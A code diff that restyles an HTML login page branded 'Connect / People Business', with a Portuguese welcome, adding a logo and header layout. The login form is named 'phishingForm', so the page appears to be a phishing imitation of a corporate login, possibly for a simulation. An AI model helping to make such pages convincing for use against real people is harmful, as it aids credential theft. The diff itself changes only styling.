@@ -24,9 +24,22 @@
       flex-direction: column;
       padding: 40px;
     }
-    .left-panel h1 {
-      font-size: 2.5rem;
+    .brand-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
       margin-bottom: 10px;
+    }
+    .brand-header img {
+      height: 50px;
+    }
+    .brand-header h1 {
+      font-size: 2.5rem;
+      margin: 0;
+    }
+    .left-panel p {
+      font-size: 1.2rem;
+      margin-top: 10px;
     }
     .right-panel {
       flex: 1;
@@ -59,17 +72,25 @@
       font-size: 0.9rem;
       color: #6a1b9a;
     }
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 80px;
+    }
   </style>
 </head>
 <body>
   <div class="container-fluid">
     <div class="left-panel">
-      <h1>connect</h1>
+      <div class="brand-header">
+        <img src="img/logo.png" alt="Logo Connect" />
+        <h1>connect</h1>
+      </div>
       <p>People Business</p>
     </div>
     <div class="right-panel">
       <div class="login-box">
-        <img src="https://via.placeholder.com/80x80.png?text=N" alt="Logo" class="logo"/>
+        <img src="img/logo.png" alt="Logo Connect" class="logo" />
         <h3>Bem-vindo(a) ao Connect</h3>
         <form id="phishingForm" action="/" method="POST">
           <div class="form-group">
